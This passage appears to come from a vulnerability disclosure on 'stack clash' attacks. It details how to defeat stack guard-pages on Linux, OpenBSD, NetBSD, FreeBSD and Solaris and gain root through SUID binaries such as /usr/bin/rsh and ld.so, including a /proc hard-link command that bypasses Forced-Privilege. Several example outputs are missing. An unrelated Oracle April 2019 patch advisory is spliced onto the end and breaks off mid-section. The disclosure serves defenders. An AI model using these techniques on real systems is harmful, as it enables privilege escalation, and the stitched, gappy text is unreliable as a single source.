of rip in Step 4a (after 6 hours on average). However, because the
addresses of all executable regions contain null-bytes, and because
most of our stack-smashes in Step 4a are string operations (except the
getaddrinfo() method), we were unable to transform such a rip control
into arbitrary code execution.
- On all kernels, either a PIE or ld.so is mapped directly below the
stack with a good probability (~1/17000) -- the end of the PIE's or
ld.so's read-write segment is then equal to the start of the stack
guard-page. We can therefore adapt our ld.so "hwcap" exploit to amd64
and obtain root privileges through most SUID binaries on most Linux
distributions (after 5 hours on average).
Kernels vulnerable to offset2lib, local Exim proof-of-concept
Exim's binary is usually a PIE, mapped at the end of the mmap region;
and the heap, which always grows up and is randomized above the end of
the binary, is therefore randomized above the end of the mmap region
(arch\_randomize\_brk() in arch/x86/kernel/process.c):
heap\_start = mmap\_end + "heap\_rand"
where "heap\_rand" is a random variable in the [0B,32MB] range
(negligible and ignored here). For example, on Debian 8.5:
# cat /proc/"`pidof -s /usr/sbin/exim4`"/maps
...
7fa6410d6000-7fa6411c8000 r-xp 00000000 08:01 14574 /usr/sbin/exim4

7ffdf3f3e000-7ffdf3f40000 r--p 00000000 00:00 0 [vvar]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
To reach the start of the stack with the end of the heap (through the -p
memory leak in Exim) in Step 1 of our stack-clash, we must minimize the
initial heap-stack distance, and hence the initial mmap-stack distance,
and set RLIMIT\_STACK to MIN\_GAP (~16GB). This limits the size of our -p
argument strings on the stack to 16GB/4=4GB, and because we then leak
the same amount of heap memory through -p, the initial heap-stack
distance must be:
- longer than 4GB (the stack must be able to contain the -p argument
strings);
- shorter than 8GB (the end of the heap must be able to reach the start
of the stack during the -p memory leak).
The initial heap-stack distance (approximately the initial mmap-stack
distance, 128MB + StackRand + MmapRand, but we ignore the 128MB term
here) follows a trapezoidal Irwin-Hall distribution, and the [4GB,8GB]
range is within the first non-uniform area of this trapezoid, so the
probability that the initial heap-stack distance is in this range is:
SUM(d = 4GB; d < 8GB; d++) d / (16GB \* 1TB)
= SUM(d = 0; d < 4GB; d++) (4GB + d) / (16GB \* 1TB)
= SUM(d = 0; d < 2^32; d++) (2^32 + d) / (2^34 \* 2^40)
~= ((2^32)\*(2^32) + (2^32)\*(2^32) / 2) / (2^74)
~= 3 / 2^11
~= 1 / 682
The probability of gaining rip control after the heap reaches the stack
is ~1/16 (as calculated by a 64-bit version of the small helper program
presented in IV.1.1.), and the final probability of gaining rip control
with our local Exim proof-of-concept is:
(3 / 2^11) \* (1/16) ~= 1 / 10922
On our 8GB Debian 8.7 test machine, this proof-of-concept takes roughly
2 seconds per run, and has a good chance of gaining rip control after
10922 \* 2 seconds ~= 6 hours:

Kernels vulnerable to offset2lib, ld.so ".dynamic" exploit
Since kernels vulnerable to offset2lib map PIEs below and close to the
stack, we tried to adapt our ld.so ".dynamic" exploit to amd64. MIN\_GAP
guarantees a minimum distance of 128MB between the theoretical end of
the mmap region and the end of the stack, but the stack then grows down
to store the argument and environment strings, and may therefore occupy
the theoretical end of the mmap region (where nothing has been mapped
yet). Consequently, the end of the mmap region (where the PIE will be
mapped) slides down to the first available address, directly below the
stack guard-page and the initial stack expansion (described in II.3.2.):
7ffbb7e51000-7ffbb7e53000 r-xp 00000000 fd:03 4465810 /tmp/test64
...
7ffbb8053000-7ffbb808c000 rw-p 00002000 fd:03 4465810 /tmp/test64
7ffbb808d000-7ffc180ae000 rw-p 00000000 00:00 0 [heap]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
Note: in this example, the "[stack]" is, again, incorrectly displayed as
the "[heap]" by show\_map\_vma() (in fs/proc/task\_mmu.c).
This layout is ideal for our stack-clash exploits, but poses an
unexpected problem: because the PIE is mapped directly below the stack,
the stack cannot grow anymore, and the only free stack space is the
initial stack expansion (128KB) minus the argv[] and envp[] pointers
(which are stored there, as mentioned in II.3.2.):
- on the one hand, many argv[] and envp[] pointers, and hence many
argument and environment strings, result in a higher probability of
mapping the PIE directly below the stack;
- on the other hand, many argv[] and envp[] pointers consume most of the
initial stack expansion and do not leave enough free stack space for
ld.so to operate.
In practice, we pass 96KB of argv[] pointers to execve(), thus leaving
32KB of free stack space for ld.so, and since the size of a pointer is
8B, and the maximum size of an argument string is 128KB, we also pass
96KB/8B\*128KB=1.5GB of argument strings to execve(). The resulting
probability of mapping the PIE directly below the stack is:
SUM(s = 0; s < 1.5GB - 128MB; s++) s / (16GB \* 1TB)
~= ((1.5GB - 128MB)^2 / 2) / (16GB \* 1TB)
~= 1 / 17331
On a 4GB Virtual Machine, each run takes 1 second, and 17331 runs take
roughly 5 hours. But we cannot add more uncertainty to this exploit, and
because of the problems discussed in IV.1.4. (null-bytes in DT\_NEEDED,
but also in DT\_AUXILIARY on 64-bit, etc), we were unable to overwrite
the .dynamic section with a pattern that does not significantly decrease
this exploit's probability of success.
All kernels, ld.so "hwcap" exploit
Despite this failure, we had an intuition: when the PIE is mapped
directly below the stack, the stack layout should be deterministic --
rsp should point into the 128KB of initial stack expansion, at a 32KB
offset above the start of the stack, and the only entropy should be the
8KB of sub-page randomization within the stack (arch\_align\_stack() in
arch/x86/kernel/process.c). The following output of our small test
program confirmed this intuition (the fourth field is the distance
between the start of the stack and our main()'s rsp when the PIE is
mapped directly below the stack):
$ grep -w sp test64.out | sort -nk4
sp 0x7ffbc271ff38 -> 28472
sp 0x7ffbb95ccff8 -> 28664

sp 0x7ffbb39bc1c8 -> 33224
sp 0x7ffbebb86838 -> 34872
Surprisingly, the output of this test program contained additional
valuable information:

- the distance between the end of the read-execute segment of our test
program and the start of its read-only and read-write segments is
approximately 2MB; indeed, for every ELF on amd64:

- several objects are actually mapped inside this ~2MB hole: [vdso],
[vvar], and two anonymous mappings (7ffbb804d000-7ffbb804e000 and
7ffbb8034000-7ffbb8037000).
This discovery allowed us to adapt our ld.so "hwcap" exploit to amd64:
- we choose hardware-capabilities that are small enough to be mapped
inside this ~2MB hole, but large enough to defeat the 8KB sub-page
randomization of the stack;
- we jump over the stack guard-page, and over the read-only and
read-write segments of the PIE, and exploit ld.so as we did on i386.
This exploit's probability of success is therefore 1 when the PIE is
mapped directly below the stack, and its final probability of success is
~1/17331: it takes 1 second per run, and has a good chance of obtaining
a root-shell after 5 hours. Moreover, it works on all kernels: if a SUID
binary is not a PIE, or if the kernel is not vulnerable to offset2lib,
we simply jump over ld.so's read-write segment, instead of the PIE's.
For example, on Fedora 25, when the exploit succeeds and loads our own
library /var/tmp/a (the 7ffbabbef000-7ffbabca7000 mapping contains the
hardware-capabilities that we smash):

IV.2. OpenBSD
========================================================================
========================================================================
IV.2.1. Maximum RLIMIT\_STACK vulnerability (CVE-2017-1000372)
========================================================================
The OpenBSD kernel limits the maximum size of the user-space stack
(RLIMIT\_STACK) to MAXSSIZ (32MB); the execve() system-call allocates a
MAXSSIZ memory region for the stack and divides it in two:
- the second part, effectively the user-space stack, is mapped
PROT\_READ|PROT\_WRITE at the end of this stack memory region, and
occupies RLIMIT\_STACK bytes (by default 8MB for root processes, and
4MB for user processes);
- the first part, effectively a large stack guard-page, is mapped
PROT\_NONE at the start of this stack memory region, and occupies
MAXSSIZ - RLIMIT\_STACK bytes.
Unfortunately, we discovered that if an attacker sets RLIMIT\_STACK to
MAXSSIZ, he eliminates the PROT\_NONE part of the stack region, and hence
the stack guard-page itself (CVE-2017-1000372). For example:
# sh -c 'ulimit -S -s; procmap -a -P'

A remote attacker cannot exploit this vulnerability, because he cannot
modify RLIMIT\_STACK; but a local attacker can set RLIMIT\_STACK to
MAXSSIZ, and:
- Step 1: malloc()ate almost 2GB of heap memory, until the heap reaches
the start of the stack region;
- Steps 2 and 3: consume MAXSSIZ (32MB) of stack memory, until the
stack-pointer reaches the start of the stack region (Step 2) and moves
into the heap (Step 3);
- Step 4: smash the stack with the heap (Step 4a) or smash the heap with
the stack (Step 4b).
========================================================================
IV.2.2. Recursive qsort() vulnerability (CVE-2017-1000373)
========================================================================
To complete Step 2, a recursive function is needed, and the first
possibly recursive function that we investigated is qsort(). On the one
hand, glibc's \_quicksort() function (in stdlib/qsort.c) is non-recursive
(iterative): it uses a small, specialized stack of partition structures
(two pointers, low and high), and guarantees that no more than 32
partitions (on i386) or 64 partitions (on amd64) are pushed onto this
stack, because it always pushes the larger of two sub-partitions and
iterates on the smaller partition.
On the other hand, BSD's qsort() function is recursive: it always
recurses on the first sub-partition, and iterates on the second
sub-partition; but instead, it should always recurse on the smaller
sub-partition, and iterate on the larger sub-partition (CVE-2017-1000373
in OpenBSD, CVE-2017-1000378 in NetBSD, and CVE-2017-1082 in FreeBSD).
In theory, because BSD's qsort() is not randomized, an attacker can
construct a pathological input array of N elements that causes qsort()
to deterministically recurse N times. In practice, because this qsort()
uses the median-of-three medians-of-three selection of a pivot element
(the "ninther"), our attack constructs an input array of N elements that
causes qsort() to recurse N/4 times.
========================================================================
IV.2.3. /usr/bin/at proof-of-concept
========================================================================
/usr/bin/at is SGID-crontab (which can be escalated to full root
privileges) because it must be able to create ("at -t"), list ("at -l"),
and remove ("at -r") job-files in the /var/cron/atjobs directory:
-r-xr-sr-x 4 root crontab 31376 Jul 26 2016 /usr/bin/at
drwxrwx--T 2 root crontab 512 Jul 26 2016 /var/cron/atjobs
To demonstrate that OpenBSD's RLIMIT\_STACK and qsort() vulnerabilities
can be transformed into powerful primitives such as heap corruption, we
developed a proof-of-concept against "at -l" (the list\_jobs() function):
- Step 1 (Clash): first, list\_jobs() malloc()ates an atjob structure for
each file in /var/cron/atjobs -- if we create 40M job-files, then the
heap reaches the stack, but we do not exhaust the address-space;
- Steps 2 and 3 (Run and Jump): second, list\_jobs() qsort()s the
malloc()ated jobs -- if we construct their time-stamps with our
qsort() attack, then we can cause qsort() to recurse 40M/4=10M times
and consume at least 10M\*4B=40MB of stack memory (each recursive call
to qsort() consumes at least 4B, the return-address) and move the
stack-pointer into the heap;
- Step 4b (Smash the heap with the stack): last, list\_jobs() free()s the
malloc()ated jobs, and abort()s with an error message -- OpenBSD's
hardened malloc() implementation detects that the heap has been
corrupted by the last recursive calls to qsort().
This naive version of our /usr/bin/at proof-of-concept poses two major
problems:
- Our pathological input array of N=40M elements cannot be sorted (Step
2 never finishes because it exhibits qsort()'s worst-case behavior,
N^2). To solve this problem, we divide the input array in two:
. the first, pathological part contains only n=(33MB/176B)\*4=768K
elements that are needed to complete Steps 2 and 3, and cause
qsort() to recurse n/4 times and consume (n/4)\*176B=33MB of stack
memory (MAXSSIZ+1MB) as each recursive call to qsort() consumes 176B
of stack memory;
. the second, innocuous part contains the remaining N-n=39M elements
that are needed to complete Step 1, but not Steps 2 and 3, and are
therefore swapped into the second, iterative partition of the first
recursive call to qsort().
- We were unable to create 40M files in /var/cron/atjobs: after one
week, OpenBSD's default filesystem (ffs) had created only 4M files,
and the rate of file creation had dropped from 25 files/second to 4
files/second. We did not solve this problem, but nevertheless wanted
to validate our proof-of-concept:
. we transformed it into an LD\_PRELOAD library that intercepts calls
to readdir() and fstatat(), and pretends that our 40M files in
/var/cron/atjobs exist;
. we made /var/cron/atjobs world-readable and LD\_PRELOADed our library
into a non-SGID copy of /usr/bin/at;
. after about an hour, "at" reports random heap corruptions:
# chmod o+r /var/cron/atjobs

IV.3. NetBSD
========================================================================
Like OpenBSD, NetBSD is vulnerable to the maximum RLIMIT\_STACK
vulnerability (CVE-2017-1000374): if a local attacker sets RLIMIT\_STACK
to MAXSSIZ, he eliminates the PROT\_NONE part of the stack region -- the
stack guard-page itself. Unlike OpenBSD, however, NetBSD:
- defines MAXSSIZ to 64MB on i386 (128MB on amd64);
- maps the run-time link-editor ld.so directly below the stack region,
even if ASLR is enabled (CVE-2017-1000375):

Consequently, a local attacker can set RLIMIT\_STACK to MAXSSIZ,
eliminate the stack guard-page, and:
- skip Step 1, because ld.so's read-write segment is naturally mapped
directly below the stack region;
- Steps 2 and 3: consume 64MB (MAXSSIZ) of stack memory (for example,
through the recursive qsort() vulnerability, CVE-2017-1000378) until
the stack-pointer reaches the start of the stack region (Step 2) and
moves into ld.so's read-write segment (Step 3);
- Step 4b: smash ld.so's read-write segment with the stack.
We did not try to exploit this vulnerability, nor did we search for a
vulnerable SUID or SGID binary, but we wrote a simple proof-of-concept,
and some of the following crashes may be exploitable:

========================================================================
IV.4.1. setrlimit() RLIMIT\_STACK vulnerability (CVE-2017-1085)
========================================================================
FreeBSD's kern\_proc\_setrlimit() function contains the following comment
and code:
/\*
\* Stack is allocated to the max at exec time with only
\* "rlim\_cur" bytes accessible. If stack limit is going
\* up make more accessible, if going down make inaccessible.
\*/
if (limp->rlim\_cur != oldssiz.rlim\_cur) {
...
if (limp->rlim\_cur > oldssiz.rlim\_cur) {
prot = p->p\_sysent->sv\_stackprot;
size = limp->rlim\_cur - oldssiz.rlim\_cur;
addr = p->p\_sysent->sv\_usrstack -
limp->rlim\_cur;
} else {
prot = VM\_PROT\_NONE;
size = oldssiz.rlim\_cur - limp->rlim\_cur;
addr = p->p\_sysent->sv\_usrstack -
oldssiz.rlim\_cur;
}
...
(void)vm\_map\_protect(&p->p\_vmspace->vm\_map,
addr, addr + size, prot, FALSE);
}
OpenBSD's and NetBSD's dosetrlimit() function contains the same comment,
which accurately describes the layout of their user-space stack region.
Unfortunately, FreeBSD's kern\_proc\_setrlimit() comment and code are
incorrect, as hinted at in exec\_new\_vmspace():
/\*
\* Destroy old address space, and allocate a new stack
\* The new stack is only SGROWSIZ large because it is grown
\* automatically in trap.c.
\*/
and vm\_map\_stack\_locked():
/\*
\* We initially map a stack of only init\_ssize. We will grow as
\* needed later.
where init\_ssize is SGROWSIZ (128KB), not MAXSSIZ (64MB on i386),
because "init\_ssize = (max\_ssize < growsize) ? max\_ssize : growsize;"
(and max\_ssize is MAXSSIZ, and growsize is SGROWSIZ).
As a result, if a program calls setrlimit() to increase RLIMIT\_STACK,
vm\_map\_protect() may turn a read-only memory region below the stack into
a read-write region (CVE-2017-1085), as demonstrated by the following
proof-of-concept:

IV.4.2. Stack guard-page disabled by default (CVE-2017-1083)
========================================================================
The FreeBSD kernel implements a 4KB stack guard-page, and recent
versions of the FreeBSD Installer offer it as a system hardening option.
Unfortunately, it is disabled by default (CVE-2017-1083):
% sysctl security.bsd.stack\_guard\_page
security.bsd.stack\_guard\_page: 0
========================================================================
IV.4.3. Stack guard-page vulnerabilities (CVE-2017-1084)
========================================================================
- If FreeBSD's stack guard-page is enabled, its entire logic is
implemented in vm\_map\_growstack(): this function guarantees a minimum
distance of 4KB (the stack guard-page) between the start of the stack
and the end of the memory region that is mapped below (but the stack
guard-page is not physically mapped into the address-space).
Unfortunately, this guarantee is given only when the stack grows down
and clashes with the memory region mapped below, but not if the memory
region mapped below grows up and clashes with the stack: this
vulnerability effectively eliminates the stack guard-page
(CVE-2017-1084). In our proof-of-concept:
. we allocate anonymous mmap()s of 4KB, until the end of an anonymous
mmap() reaches the start of the stack [Step 1];
. we call a recursive function until the stack-pointer reaches the
start of the stack and moves into the anonymous mmap() directly
below [Step 2];
. but we do not jump over the stack guard-page, because each call to
the recursive function allocates (and fully writes to) a 1KB
stack-based buffer [Step 3];
. and we do not crash into the stack guard-page, because CVE-2017-1084
has effectively eliminated the stack guard-page in Step 1.
# sysctl security.bsd.stack\_guard\_page=1
security.bsd.stack\_guard\_page: 0 -> 1
% ./FreeBSD\_CVE-2017-FGPU
char at 0xbfbde000: 41
- vm\_map\_growstack() implements most of the stack guard-page logic in
the following code:
/\*
\* Growing downward.
\*/
/\* Get the preliminary new entry start value \*/
addr = stack\_entry->start - grow\_amount;
/\*
\* If this puts us into the previous entry, cut back our
\* growth to the available space. Also, see the note above.
\*/
if (addr < end) {
stack\_entry->avail\_ssize = max\_grow;
addr = end;
if (stack\_guard\_page)
addr += PAGE\_SIZE;
}
where:
. addr is the new start of the stack;
. stack\_entry->start is the old start of the stack;
. grow\_amount is the size of the stack expansion;
. end is the end of the memory region below the stack.
Unfortunately, the "addr < end" test should be "addr <= end": if addr,
the new start of the stack, is equal to end, the end of the memory
region mapped below, then the stack guard-page is eliminated
(CVE-2017-1084). In our proof-of-concept:
. we allocate anonymous mmap()s of 4KB, until the end of an anonymous
mmap() reaches a randomly chosen distance below the start of the
stack [Step 1];
. we call a recursive function until the stack-pointer reaches the
start of the stack, and the stack expansion reaches the end of the
anonymous mmap() below [Step 2];
. we do not jump over the stack guard-page, because each call to the
recursive function allocates (and fully writes to) a 1KB stack-based
buffer [Step 3];
. and we crash into the stack guard-page most of the time;
. but we survive with a probability of 4KB/128KB=1/32 (grow\_amount is
always a multiple of SGROWSIZ, 128KB) because CVE-2017-1084 has
effectively eliminated the stack guard-page in Step 2.

IV.4.4. Remote exploitation
========================================================================
Because FreeBSD's stack guard-page is disabled by default, we tried (and
failed) to remotely exploit a test service vulnerable to:
- an unlimited memory leak that allows us to malloc()ate gigabytes of
memory;
- a limited recursion that allows us to allocate up to 1MB of stack
memory.
FreeBSD's malloc() implementation (jemalloc) mmap()s 4MB chunks of
anonymous memory that are aligned on multiples of 4MB. The first 4MB
mmap() chunk starts at 0x28400000, and the last 4MB mmap() chunk ends at
0xbf800000, because the stack itself already ends at 0xbfc00000; but it
is impossible to cover this final mmap-stack distance (almost 4MB) with
the limited recursion (1MB) of our test service.

IV.5. Solaris >= 11.1
========================================================================
========================================================================
IV.5.1. Minimal RLIMIT\_STACK vulnerability (CVE-2017-3630)
========================================================================
On Solaris, ASLR can be enabled or disabled for each ELF binary with the
SUNW\_ASLR dynamic section entry (man elfedit):
$ elfdump /usr/bin/rsh | egrep 'ASLR|NX'
[39] SUNW\_ASLR 0x2 ENABLE
[40] SUNW\_NXHEAP 0x2 ENABLE
[41] SUNW\_NXSTACK 0x2 ENABLE
Without ASLR
If ASLR is disabled:
- a stack region of size RLIMIT\_STACK is reserved in the address-space;
- a 4KB stack guard-page is mapped directly below this stack region;
- the runtime linker ld.so is mapped directly below this stack
guard-page.
$ cp /usr/bin/sleep .

On the one hand, a local attacker can exploit this simplified
stack-clash:
- Step 1 (Clash) is not needed, because ld.so is naturally mapped
directly below the stack (the distance between the end of ld.so's
read-write segment and the start of the stack is 4KB, the stack
guard-page);
- Step 2 (Run) is not needed, because a local attacker can set
RLIMIT\_STACK to just a few kilobytes, reserve a very small stack
region, and hence shorten the distance between the stack-pointer and
the start of the stack (and the end of ld.so's read-write segment);
- Step 3 (Jump) can be completed with a large stack-based buffer that is
not fully written to;
- Step 4b (Smash) can be completed by overwriting the function pointers
in ld.so's read-write segment with the contents of a stack-based
buffer.
Such a simplified stack-clash exploit was first mentioned in Gael
Delalleau's 2005 presentation (slide 30).
On the other hand, a remote attacker cannot modify RLIMIT\_STACK and must
complete Step 2 (Run) with a recursive function that consumes the 8MB
(the default RLIMIT\_STACK) between the stack-pointer and the start of
the stack.
With ASLR
If ASLR is enabled:
- a stack region of size RLIMIT\_STACK is reserved in the address-space;
- a 4KB stack guard-page is mapped directly below this stack region;
- the runtime linker ld.so is mapped below this stack guard-page, but at
a random distance (within a [4KB,128MB] range) -- effectively a large,
secondary stack guard-page.
On the one hand, a local attacker can run the simplified "Without ASLR"
stack-clash exploit until the ld.so-stack distance is minimal -- with a
probability of 4KB/128MB=1/32K, the distance between the end of ld.so's
read-write segment and the start of the stack is exactly 8KB: the stack
guard-page plus the minimum distance between the stack guard-page and
ld.so (CVE-2017-3629).
On the other hand, a remote attacker must complete Step 2 (Run) with a
recursive function, and:
- has a good chance of exploiting this stack-clash after 32K connections
(when the ld.so-stack distance is minimal) if the remote service
re-execve()s (re-randomizes the ld.so-stack distance for each new
connection);
- cannot exploit this stack-clash if the remote service does not
re-execve() (does not re-randomize the ld.so-stack distance for each
new connection) unless the attacker is able to restart the service,
reboot the server, or target a 32K-server farm.
========================================================================
IV.5.2. /usr/bin/rsh exploit
========================================================================
/usr/bin/rsh is SUID-root and its main() function allocates a 50KB
stack-based buffer that is not written to and can be used to jump over
the stack guard-page, into ld.so's read-write segment, in Step 3 of our
simplified stack-clash exploit.
Next, we discovered a general method for gaining eip control in Step 4b:
setlocale(LC\_ALL, ""), called by the main() function of /usr/bin/rsh and
other SUID binaries, copies the LC\_ALL environment variable to several
stack-based buffers and thus smashes ld.so's read-write segment and
overwrites some of ld.so's function pointers.
Last, we execute our own shell-code: we return-into-binary (/usr/bin/rsh
is not a PIE), to an instruction that reliably jumps into a copy of our
LC\_ALL environment variable in ld.so's read-write segment, which is in
fact read-write-executable. For example, after we gain control of eip:
- on Solaris 11.1, we return to a "pop; pop; ret" instruction, because a
pointer to our shell-code is stored at an 8-byte offset from esp;
- on Solaris 11.3, we return to a "call \*0xc(%ebp)" instruction, because
a pointer to our shell-code is stored at a 12-byte offset from ebp.
Our Solaris exploit brute-forces the random ld.so-stack distance and two
parameters:
- the RLIMIT\_STACK;
- the length of the LC\_ALL environment variable.
========================================================================
IV.5.3. Forced-Privilege vulnerability (CVE-2017-3631)
========================================================================
/usr/bin/rsh is SUID-root, but the shell that we obtained in Step 4b of
our stack-clash exploit did not grant us full root privileges, only
net\_privaddr, the privilege to bind to a privileged port number.
Disappointed by this result, we investigated and found:
$ ggrep -r /usr/bin/rsh /etc 2>/dev/null
/etc/security/exec\_attr.d/core-os:Forced Privilege:solaris:cmd:RO::/usr/bin/rsh:privs=net\_privaddr
$ /usr/bin/rsh -h
/usr/bin/rsh: illegal option -- h
usage: rsh [ -PN / -PO ] [ -l login ] [ -n ] [ -k realm ] [ -a ] [ -x ] [ -f / -F ] host command
rsh [ -PN / -PO ] [ -l login ] [ -k realm ] [ -a ] [ -x ] [ -f / -F ] host
# cat truss.out
...
7319: execve("/usr/bin/rsh", 0xA9479C548, 0xA94792808) argc = 2
7319: \*\*\* FPRIV: P/E: net\_privaddr \*\*\*
...
Unfortunately, this Forced-Privilege protection is based on the pathname
of SUID-root binaries, which can be execve()d through hard-links, under
different pathnames (CVE-2017-3631). For example, we discovered that
readable SUID-root binaries can be execve()d through hard-links in
/proc:
$ sleep 3 < /usr/bin/rsh & /proc/${!}/fd/0 -h
[1] 7333
/proc/7333/fd/0: illegal option -- h
usage: rsh [ -PN / -PO ] [ -l login ] [ -n ] [ -k realm ] [ -a ] [ -x ] [ -f / -F ] host command
rsh [ -PN / -PO ] [ -l login ] [ -k realm ] [ -a ] [ -x ] [ -f / -F ] host
# cat truss.out
...
7335: execve("/proc/7333/fd/0", 0xA947CA508, 0xA94792808) argc = 2
7335: \*\*\* SUID: ruid/euid/suid = 100 / 0 / 0 \*\*\*
...
This vulnerability allows us to bypass the Forced-Privilege protection
and obtain full root privileges with our /usr/bin/rsh exploit.

# Oracle Critical Patch Update Advisory - April 2019

## Oracle Critical Patch Update Advisory - April 2019

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

* [Critical Patch Updates, Security Alerts and Bulletins](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 297 new security fixes across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2019 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2494878.1).

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from [http://www.java.com/en/](//www.java.com/en/). Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2019verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Until you apply the Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Oracle E-Business Suite Risk Matrix

This Critical Patch Update contains 35 new security fixes for the Oracle E-Business Suite.  33 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2019verbose.html#EBS).

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the April 2019 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (April 2019), [My Oracle Support Note 2514102.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2514102.1).

### Oracle Enterprise Manager Products Suite Risk Matrix

This Critical Patch Update contains 11 new security fixes for the Oracle Enterprise Manager Products Suite.  7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these fixes are applicable to client-only installations, i.e., installations that do not have the Oracle Enterprise Manager Products Suite installed. The English text form of this Risk Matrix can be found [here](/security-alerts/cpuapr2019verbose.html#EM).

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the April 2019 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2019 Patch Availability Document for Oracle Products, [My Oracle Support Note 2498664.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2498664.1).

### Oracle Java SE Risk Matrix

